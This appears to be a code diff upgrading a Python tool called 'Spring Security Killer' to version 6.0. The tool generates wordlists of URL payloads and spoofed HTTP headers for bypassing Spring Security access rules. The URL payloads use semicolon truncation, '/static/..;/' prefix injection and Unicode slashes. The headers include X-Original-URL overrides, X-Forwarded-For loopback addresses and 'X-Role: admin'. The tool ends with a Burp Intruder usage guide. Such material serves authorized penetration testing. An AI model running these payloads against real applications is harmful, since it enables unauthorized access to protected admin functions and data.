@@ -3,16 +3,13 @@
 
 """
 --------------------------------------------------------------------------------------
- Tool Name   : Spring Security Killer V1.1 (Global Insight Edition)
- Author      : 七萬-QiWan777
+ Tool Name   : Spring Security Killer v6.0 (Full Stack Edition)
+ Author      : 七萬-QiWan
  Date        : 2025-11-23
- Description : The most comprehensive Spring Security Fuzz Generator utilizing
-               global security research (Orange Tsai, BlackHat, DEFCON).
- New Vectors :
-   [+] Prefix Injection (Bypass /public/** rules)
-   [+] Unicode normalization (%ef%bc%8f -> /)
-   [+] Spring Cloud Gateway specifics
-   [+] PathPatternParser vs AntPathMatcher
+ Description : The complete Spring Security assessment suite.
+               Generates both URL-based bypass payloads and Header-based spoofing lists.
+ New Module  :
+   [+] Header Generator: IP Spoofing, URL Overriding (X-Original-URL), Protocol Confusion.
 --------------------------------------------------------------------------------------
 """
 
@@ -47,173 +44,161 @@ class Logger:
 
 
 # ===========================
-# The Ultimate Engine
+# URL Engine (Preserved from v5.0)
 # ===========================
-class GlobalKillerEngine:
+class UrlFuzzEngine:
     def __init__(self):
-        # 存储 (payload, weight, category)
         self.payloads = []
         self.seen = set()
-
-        # 定义常见白名单前缀 (用于前缀注入)
-        self.common_whitelists = [
-            '/static', '/public', '/resources', '/assets',
-            '/images', '/css', '/js', '/error', '/favicon.ico'
-        ]
+        self.common_whitelists = ['/static', '/public', '/resources', '/assets', '/js', '/error']
 
     def add(self, payload, weight, tag="General"):
-        """添加并去重"""
         if payload not in self.seen:
             self.seen.add(payload)
             self.payloads.append({'p': payload, 'w': weight, 't': tag})
 
     def generate(self, base_path):
-        """主生成逻辑"""
         path = "/" + base_path.strip().lstrip("/")
         if "?" in path: path = path.split("?")[0]
 
-        # 1. 核心层: 矩阵变量 (Matrix Variables) [Weight: 10]
-        # ---------------------------------------------------
+        # 1. Matrix Variables
         self._layer_matrix(path)
-
-        # 2. 核心层: 路径归一化 (Normalization) [Weight: 9]
-        # ---------------------------------------------------
+        # 2. Normalization
         self._layer_normalization(path)
-
-        # 3. 进阶层: 白名单前缀注入 (Prefix Injection) [Weight: 8]
-        # *NEW in v5.0* - 针对 /public/** permitAll 的绕过
-        # ---------------------------------------------------
+        # 3. Prefix Injection
         self._layer_prefix_injection(path)
-
-        # 4. 进阶层: 后缀混淆 (Suffix Confusion) [Weight: 7]
-        # ---------------------------------------------------
+        # 4. Suffix Confusion
         self._layer_suffix_confusion(path)
-
-        # 5. 专家层: Unicode 与编码差异 (Encoding) [Weight: 6]
-        # *NEW in v5.0* - 针对 WAF 和 Tomcat 解析差异
-        # ---------------------------------------------------
+        # 5. Advanced Encoding
         self._layer_advanced_encoding(path)
-
-        # 6. 专家层: 协议与方法覆盖 (Protocol) [Weight: 5]
-        # ---------------------------------------------------
+        # 6. Protocol Confusion
         self._layer_protocol_confusion(path)
 
     def _layer_matrix(self, path):
-        """利用 ; 截断。这是 Spring 最频繁的漏洞点"""
         parts = path.strip('/').split('/')
-
-        # 逐级插入
         current = ""
         for i, part in enumerate(parts):
             current += "/" + part
             remaining = "/" + "/".join(parts[i + 1:]) if i < len(parts) - 1 else ""
-
             self.add(current + ";" + remaining, 10, "Matrix")
             self.add(current + ";/" + remaining, 10, "Matrix")
-            # 伪造参数
             self.add(current + ";jsessionid=x" + remaining, 10, "Matrix")
-            self.add(current + ";name=test" + remaining, 9, "Matrix")
-
-        # 尾部
         self.add(path + ";", 10, "Matrix")
-        self.add(path + ";.css", 9, "Matrix")
 
     def _layer_normalization(self, path):
-        """利用 / 和 . 的解析差异"""
-        # Nginx 往往合并 //, Spring 可能不合并
         self.add(path.replace('/', '//'), 9, "Norm")
         self.add('//' + path.lstrip('/'), 9, "Norm")
-        self.add(path + "/", 8, "Norm")
-
-        # /./ 混淆
         self.add(path.replace('/', '/./'), 9, "Norm")
-
-        # 跨目录回溯 (Path Traversal)
-        # Nginx 看到 /foo/.. 认为抵消了, Spring 看到 ..;/ 认为是个路径段
         self.add(f"/;{path}", 9, "Norm")
         self.add(f"/foo/..;{path}", 9, "Norm")
 
     def _layer_prefix_injection(self, path):
-        """
-        [Global Insight] 很多系统允许 /static/**
-        Payload: /static/..;/admin/users
-        """
-        for whitelist in self.common_whitelists:
-            # 构造: /whitelist/..;/target
-            payload = f"{whitelist}/..;{path}"
-            self.add(payload, 8, "Prefix-Inject")
-
-            # 构造: /whitelist/../target (标准 Nginx 绕过)
-            payload_nginx = f"{whitelist}/..{path}"
-            self.add(payload_nginx, 7, "Prefix-Inject")
+        for w in self.common_whitelists:
+            self.add(f"{w}/..;{path}", 8, "Prefix-Inj")
+            self.add(f"{w}/..{path}", 7, "Prefix-Inj")
 
     def _layer_suffix_confusion(self, path):
-        """后缀伪造"""
-        exts = ['.json', '.html', '.css', '.js', '.png']
-        for ext in exts:
+        for ext in ['.json', '.html', '.css', '.js']:
             self.add(path + ext, 7, "Suffix")
-            self.add(path + ";" + ext, 8, "Suffix")  # 结合分号
-            self.add(path + "/" + ext, 6, "Suffix")  # /user/.json
+            self.add(path + ";" + ext, 8, "Suffix")
 
     def _layer_advanced_encoding(self, path):
-        """
-        [Global Insight] 全角字符与 Unicode
-        Tomcat/Spring 在某些配置下会归一化全角字符
-        """
-        # 1. 双重编码
         self.add(path.replace('/', '%252f'), 6, "Encode")
-
-        # 2. Unicode 全角斜杠 (Full-width Solidus: ／ -> %ef%bc%8f)
-        # 某些 WAF 不认识这个字符，但后端 Java 会把它变成 /
-        path_unicode = path.replace('/', '%ef%bc%8f')
-        self.add(path_unicode, 6, "Unicode")
-
-        # 3. URL Encoded Dot
+        self.add(path.replace('/', '%ef%bc%8f'), 6, "Unicode")
         self.add(path.replace('.', '%2e'), 6, "Encode")
 
     def _layer_protocol_confusion(self, path):
-        """方法覆盖与参数污染"""
-        # HiddenHttpMethodFilter
         self.add(path + "?_method=POST", 5, "Method")
-        self.add(path + "?_method=DELETE", 5, "Method")
-
-        # 尾部 ? 绕过 (Spring Cloud Gateway)
         self.add(path + "?", 5, "Gateway")
         self.add(path + "#", 5, "Gateway")
 
     def get_results(self):
-        # 按权重排序 (Weight Descending)
         return sorted(self.payloads, key=lambda x: x['w'], reverse=True)
 
 
 # ===========================
-# Auto-Discovery
+# Header Engine (New Module)
+# ===========================
+class HeaderFuzzEngine:
+    def __init__(self):
+        self.headers = []
+
+    def generate(self, target_paths):
+        """
+        Generates headers based on common bypass techniques.
+        target_paths: List of sensitive paths (e.g., /admin) to use in X-Original-URL
+        """
+        # 1. IP Spoofing (Bypass IP Whitelists)
+        # -------------------------------------
+        spoof_ips = ["127.0.0.1", "localhost", "0.0.0.0", "192.168.0.1", "10.0.0.1"]
+        ip_headers = [
+            "X-Forwarded-For", "X-Originating-IP", "X-Remote-IP", "X-Remote-Addr",
+            "Client-IP", "X-Real-IP", "X-Client-IP", "True-Client-IP", "Cluster-Client-IP"
+        ]
+
+        for header in ip_headers:
+            for ip in spoof_ips:
+                self.headers.append(f"{header}: {ip}")
+                # Double IP spoofing (sometimes works for proxies)
+                self.headers.append(f"{header}: {ip}, {ip}")
+
+        # 2. URL Overriding (Bypass URL ACLs)
+        # -----------------------------------
+        # 这里的逻辑是：请求访问一个低权限 URL (如 /)，但在 Header 里告诉后端其实要访问 /admin
+        # 注意：在 Burp 中，你需要将请求路径改为 / 或 /public，然后配合这些 Header
+        url_headers = ["X-Original-URL", "X-Rewrite-URL", "X-Forwarded-Prefix"]
+
+        for path in target_paths:
+            clean_path = "/" + path.strip().lstrip("/")
+            for header in url_headers:
+                self.headers.append(f"{header}: {clean_path}")
+                # 尝试不带前导斜杠
+                self.headers.append(f"{header}: {clean_path.lstrip('/')}")
+
+        # 3. Protocol & Port Confusion
+        # ----------------------------
+        self.headers.append("X-Forwarded-Proto: http")  # 绕过强制 HTTPS
+        self.headers.append("X-Forwarded-Proto: https")
+        self.headers.append("X-Forwarded-Port: 443")
+        self.headers.append("X-Forwarded-Port: 80")
+        self.headers.append("X-Forwarded-Scheme: http")
+
+        # 4. Custom Auth Spoofing
+        # -----------------------
+        # 针对某些微服务架构内部传递用户信息
+        self.headers.append("X-User-Id: 1")
+        self.headers.append("X-User-Id: admin")
+        self.headers.append("X-Role: admin")
+        self.headers.append("X-Admin: true")
+
+        return list(set(self.headers))  # Dedup
+
+
+# ===========================
+# Main Workflow
 # ===========================
 def auto_detect_file():
     cwd = os.getcwd()
-    files = [f for f in os.listdir(cwd) if
-             os.path.isfile(f) and f.endswith('.txt') and not f.startswith('fuzz_bypass_')]
+    files = [f for f in os.listdir(cwd) if os.path.isfile(f) and f.endswith('.txt') and not f.startswith('fuzz_')]
     if not files:
         Logger.warn("No target .txt files found.")
         sys.exit(1)
-    return files[0]  # Default to first found
+    return files[0]
 
 
-# ===========================
-# Main
-# ===========================
 def main():
     os.system('cls' if os.name == 'nt' else 'clear')
     print(f"{Colors.BOLD}{Colors.HEADER}")
     print(r"""
-   _________            _               ____  __      _______   
-  /   _____/___________|__| ____   ____|    |/ _|____ \   _  \  
-  \_____  \\____ \_  __ \  |/    \/ ___|      < /  _ \/  /_\  \ 
-  /        \  |_> >  | \/  |   |  \___ \    |  (  <_> )  \_/   \
- /_______  /   __/|__|  |__|___|  /____>____|__ \____/\_____  /
-         \/|__|                 \/             \/           \/  
-    Spring Security Killer V1.1 [Global Insight Edition]
-    Author: 七萬-QiWan777
+   _________            _               ____  __   ________   
+  /   _____/___________|__| ____   ____|    |/ _| /  _____/   
+  \_____  \\____ \_  __ \  |/    \/ ___|      <  /   __  \    
+  /        \  |_> >  | \/  |   |  \___ \    |  \ \  |__\  \   
+ /_______  /   __/|__|  |__|___|  /____>____|__ \ \_____  /   
+         \/|__|                 \/             \/       \/    
+    Spring Security Killer v6.0 [Full Stack Edition]
+    Author: 七萬-QiWan
+    Modes : URL Bypass + Header Injection
     """)
     print(f"{Colors.ENDC}")
 
@@ -226,29 +211,44 @@ def main():
     except:
         sys.exit(1)
 
-    engine = GlobalKillerEngine()
-
-    print(f"{Colors.CYAN}[*] Applying Global Research Patterns...{Colors.ENDC}")
+    # 1. Generate URL Payloads
+    url_engine = UrlFuzzEngine()
+    print(f"{Colors.CYAN}[*] Generating Context-Aware URL Payloads...{Colors.ENDC}")
     for t in targets:
-        engine.generate(t)
+        url_engine.generate(t)
+    url_results = url_engine.get_results()
 
-    results = engine.get_results()
+    # 2. Generate Header Payloads
+    header_engine = HeaderFuzzEngine()
+    print(f"{Colors.CYAN}[*] Generating Spoofed Headers...{Colors.ENDC}")
+    header_results = header_engine.generate(targets)
 
-    # Output
+    # 3. Save Outputs
     now = datetime.datetime.now()
-    filename = f"fuzz_bypass_{now.strftime('%Y%m%d_%H%M')}.txt"
+    timestamp = now.strftime('%Y%m%d_%H%M')
 
-    with open(filename, 'w') as f:
-        for item in results:
+    file_urls = f"fuzz_urls_{timestamp}.txt"
+    file_headers = f"fuzz_headers_{timestamp}.txt"
+
+    # Save URLs
+    with open(file_urls, 'w') as f:
+        for item in url_results:
             f.write(f"{item['p']}\n")
 
-    Logger.success(f"Generated {len(results)} Advanced Payloads.")
-    Logger.success(f"File: {os.path.abspath(filename)}")
+    # Save Headers
+    with open(file_headers, 'w') as f:
+        for h in header_results:
+            f.write(f"{h}\n")
 
-    # 打印前10个高危 Payload 示例
-    print("\n[+] Top 10 High-Probability Payloads Preview:")
-    for i, item in enumerate(results[:10]):
-        print(f"    {item['w']} | {item['t'].ljust(13)} | {item['p']}")
+    print("-" * 50)
+    Logger.success(f"Generated {len(url_results)} URL Payloads -> {file_urls}")
+    Logger.success(f"Generated {len(header_results)} Header Payloads -> {file_headers}")
+
+    print(f"\n{Colors.WARNING}[!] Tactical Guide (How to use Headers):{Colors.ENDC}")
+    print("    1. Load 'fuzz_headers_xxxx.txt' into Burp Intruder.")
+    print("    2. Injection Point: Insert beneath standard headers.")
+    print("    3. Logic: Send request to / (home) but inject 'X-Original-URL: /admin'.")
+    print("    4. Watch for: 200 OK or changes in Content-Length.")
 
 
 if __name__ == "__main__":
